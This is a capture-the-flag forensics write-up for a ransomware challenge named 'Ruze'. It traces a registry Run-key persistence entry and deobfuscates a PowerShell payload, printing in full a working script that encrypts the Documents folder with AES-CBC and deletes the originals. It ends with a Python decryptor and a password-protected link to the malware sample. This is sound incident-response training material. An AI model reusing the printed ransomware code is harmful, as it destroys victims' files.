# Ruze

### Status : Upsolved

## Category
Forensics

## Description
You are a DFIR Consultant, you got a client (MR. K) who has a ransomware problem, where when he installs something suddenly his device reboots and his files suddenly disappear, and there are files that confirm that he was hit by ransomware. can you help him?

Note : Dont execute the malicious file on your computer!

Note : Remember you are a DFIR Consultant, not a malware consultant who focus to analyze the ransomware file!

you can download the file you need in here : [https://mega.nz/file/Ln53ARjT#ZUwOX1WBfTsRjgjsYgsHB5xr6d4pGNpVPr8N3kl6WhI](https://mega.nz/file/Ln53ARjT#ZUwOX1WBfTsRjgjsYgsHB5xr6d4pGNpVPr8N3kl6WhI)

Password : 1nip4ssw0rdny4

## Solve
The format of given file is AD1 so we need to check it with FTK Imager.

![image](https://github.com/user-attachments/assets/2106c011-7c08-4a26-83fa-5607aa1864de)

There is non-default user **sand-4ECC834FCF** so I tried to analyze it.
In description '.. when he installs something suddenly his device reboots and his files suddenly disappear .. ', we can assume the ransomware need to reboot/login for got executed. In windows you can set what device will do everytime user got login in Registry Key. 

I used Registry Explorer from [https://ericzimmerman.github.io/#!index.md](https://ericzimmerman.github.io/#!index.md) tool to check on registry HCKU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run for malicious entry via NTUSER.DAT

![image](https://github.com/user-attachments/assets/6c1ba36e-b037-41ca-b6dc-cfc2b13853db)

We can know that there is file named **console.bat** was executed. The content of that file is encoded powershell code.

![image](https://github.com/user-attachments/assets/ffd3caf0-fc14-454c-b14d-28582ce9bf3c)

I used [powerdecode](https://github.com/Malandrone/PowerDecode) tool to decode and deobfuscate it and this is the result.

```shell
function Encrypt-File {
    param (
        [string]$sourceFilePath,
        [string]$destFilePath,
        [string]$encryptionKey,
        [string]$initVector
    )
    
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
    $ivBytes = [System.Text.Encoding]::UTF8.GetBytes($initVector)

    # Validate key length (must be 16, 24, or 32 bytes)
    if ($keyBytes.Length -ne 16 -and $keyBytes.Length -ne 24 -and $keyBytes.Length -ne 32) {
        throw "ERROR"
    }
    
    # Validate IV length (must be 16 bytes)
    if ($ivBytes.Length -ne 16) {
        throw "ERROR"
    }

    $aes = New-Object "System.Security.Cryptography.AesManaged"
    $aes.Key = $keyBytes
    $aes.IV = $ivBytes
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $fileContent = [System.IO.File]::ReadAllBytes($sourceFilePath)
    $encryptor = $aes.CreateEncryptor()
    $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)

    # Combine IV and encrypted content
    [byte[]] $finalContent = $aes.IV + $encryptedContent
    $aes.Dispose()

    Write-Output $destFilePath
    $result = [System.IO.File]::WriteAllBytes($destFilePath, $finalContent)
    Write-Output "done"
    Remove-Item -Path $sourceFilePath
}

# Main script
$userDocuments = "C:\Users\" + $Env:UserName + "\Documents"
$sourcePath = $userDocuments
$encryptedFilesPath = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Garage"

# Create directory for encrypted files
try {
    New-Item -Path $encryptedFilesPath -ItemType Directory -ErrorAction Stop
} catch [System.IO.IOException] {
    "Already Exist!"
}

# Registry path where encryption keys are stored
$registryPath = "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77"
$encryptionKey = (Get-ItemProperty -Path $registryPath -Name "59e2beee1b06")."59e2beee1b06"
$initVector = (Get-ItemProperty -Path $registryPath -Name "076a2843f321")."076a2843f321"

Write-Output $encryptionKey

if (-not (Test-Path -Path $registryPath)) {
    New-Item -ItemType Directory -Path $registryPath
}

# Get all files in the Documents folder
$files = Get-ChildItem -Path $sourcePath -File

# Encrypt each file
foreach ($file in $files) {
    $sourceFile = $file.FullName
    $destFile = Join-Path -Path $encryptedFilesPath -ChildPath $file.Name
    Encrypt-File $sourceFile $destFile $encryptionKey $initVector
}

Write-Output "dones"
```

That script encrypt all files from document folder and save it to \AppData\Local\Microsoft\Garage

![image](https://github.com/user-attachments/assets/73ad78b2-a7ea-4c6e-b27c-52ef936e253c)

From the script we can know the encryption method used is AES CBC using key and iv that stored to HKCU:\Software\Microsoft\Windows NT\CurrentVersion\02e7a9afbb77

![image](https://github.com/user-attachments/assets/94f5538e-de4e-44ec-9d98-8b0babfe7366)

Here is the solver I used :

```python
from Crypto.Cipher import AES

file = open('seccreettttt_credentialll_confidentalll_moodd_booossteerrrr.pdf', 'rb').read()
key = b'ea0aaa5d53dddfe1'
iv = file[0:16]
encrypted = file[16:]

cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(encrypted)

result = open('result.pdf', 'wb').write(decrypted)
```

![image](https://github.com/user-attachments/assets/14e69fd8-a7fb-4bf6-ac97-fab79f814660)

## Flag
gemastik{be_careful_with_what_is_on_the_internet_r4nsom_everywhere}

